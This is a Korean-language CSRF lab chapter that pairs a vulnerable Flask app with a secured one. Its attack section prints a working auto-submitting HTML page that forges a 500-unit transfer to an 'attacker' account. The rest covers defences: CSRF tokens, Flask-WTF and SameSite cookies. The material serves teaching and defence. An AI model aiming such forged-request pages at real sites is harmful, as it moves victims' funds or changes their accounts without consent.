# Chapter 06: CSRF 실습

## 학습 목표
- CSRF 공격 원리 이해
- CSRF 토큰 구현
- SameSite 쿠키 설정

## 실습 환경

```bash
docker-compose up -d
# 취약한 버전: http://localhost:5001
# 안전한 버전: http://localhost:5002
```

## 공격 실습

### 1. 피해자 로그인
http://localhost:5001에서 alice로 로그인

### 2. 공격 페이지 생성
```html
<!-- attacker.html -->
<html>
<body>
<form action="http://localhost:5001/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="500">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### 3. 피해자가 공격 페이지 방문 시 자동 송금

## 방어 기법

### Flask-WTF CSRF 보호
```python
from flask_wtf import CSRFProtect
csrf = CSRFProtect(app)
```

### 템플릿에 토큰 추가
```html
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

## 체크리스트
- [ ] CSRF 토큰 구현
- [ ] POST 요청만 허용
- [ ] SameSite=Strict 쿠키
